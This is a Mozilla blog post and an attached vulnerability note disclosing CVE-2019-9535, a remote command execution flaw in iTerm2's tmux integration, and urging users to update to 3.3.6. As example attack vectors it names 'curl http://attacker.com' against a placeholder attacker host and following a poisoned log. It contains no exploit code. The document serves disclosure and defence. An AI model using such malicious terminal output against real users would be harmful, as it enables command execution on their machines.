# Critical Security Issue identified in iTerm2 as part of Mozilla Open Source Audit

Tom Ritter
October 9, 2019

A security audit funded by the [Mozilla Open Source Support Program](https://mozilla.org/moss) (MOSS) has discovered a critical security vulnerability in the widely used macOS terminal emulator [iTerm2](https://iterm2.com/). After finding the vulnerability, Mozilla, [Radically Open Security](https://radicallyopensecurity.com/) (ROS, the firm that conducted the audit), and iTerm2’s developer George Nachman worked closely together to develop and release a patch to ensure users were no longer subject to this security threat. All users of iTerm2 should update immediately to the latest version (3.3.6) which has been [published concurrent](https://groups.google.com/forum/m/#!topic/iterm2-discuss/57k_AuLdQa4) with this blog post.

Founded in 2015, MOSS broadens access, increases security, and empowers users by providing catalytic support to open source technologists. Track III of MOSS — created in the wake of the 2014 [Heartbleed vulnerability](http://heartbleed.com/) — supports security audits for widely used open source technologies like iTerm2. Mozilla is an open source company, and the funding MOSS provides is one of the key ways that we continue to ensure the open source ecosystem is healthy and secure.

[iTerm2](https://iterm2.com/) is one of the most popular terminal emulators in the world, and frequently used by developers. MOSS selected iTerm2 for a security audit because it processes untrusted data and it is widely used, including by high-risk targets (like developers and system administrators).

During the audit, ROS identified a critical vulnerability in the tmux integration feature of iTerm2; this vulnerability has been present in iTerm2 for at least 7 years. An attacker who can produce output to the terminal can, in many cases, execute commands on the user’s computer. Example attack vectors for this would be connecting to an attacker-controlled SSH server or commands like *curl http://attacker.com* and *tail -f /var/log/apache2/referer\_log*. We expect the community will find many more creative examples.

*Proof-of-Concept video of a command being run on a mock victim’s machine after connecting to a malicious SSH server. In this case, only a calculator was opened as a placeholder for other, more nefarious commands.*

Typically this vulnerability would require some degree of user interaction or trickery; but because it can be exploited via commands generally considered safe there is a high degree of concern about the potential impact.

An update to iTerm2 is now available with a mitigation for this issue, which has been assigned CVE-2019-9535. While iTerm2 will eventually prompt you to update automatically, we recommend you proactively update by going to the iTerm2 menu and choosing **Check for updates…** The fix is available in version 3.3.6. A prior update was published earlier this week (3.3.5),  it does not contain the fix.

## iTerm2 with tmux integration is vulnerable to remote command execution

#### Vulnerability Note VU#763073

Original Release Date: 2019-10-09 | Last Revised: 2019-10-25

---

### Overview

iTerm2, up to and including version 3.3.5, with tmux integration is vulnerable to remote command execution.

### Description

| iTerm2 is a popular terminal emulator for macOS that supports terminal multiplexing using tmux integration and is frequently used by developers and system administrators. A vulnerability, identified as CVE-2019-9535, exists in the way that iTerm2 integrates with tmux's control mode, which may allow an attacker to execute arbitrary commands by providing malicious output to the terminal. This affects versions of iTerm2 up to and including 3.3.5. |
| --- |

### Impact

| This vulnerability may allow an attacker to execute arbitrary commands on their victim's computer by providing malicious output to the terminal. It could be exploited using command-line utilities that print attacker-controlled content. Potential attack vectors include connecting via ssh to a malicious server, using curl to fetch a malicious website, or using tail -f to follow a logfile containing some malicious content. |
| --- |

### Solution

| **Apply an update**  Update iTerm2 to version 3.3.6, which includes mitigations against exploitation of this vulnerability. The latest version is available as an update within the program itself, or can be downloaded [here](https://www.iterm2.com/downloads.html). As the tmux integration cannot be disabled through configuration, a complete resolution is not yet available. We recommend that users of tmux integration follow the [best practices](https://gitlab.com/gnachman/iterm2/wikis/tmux-Integration-Best-Practices) outlined by iTerm2. |
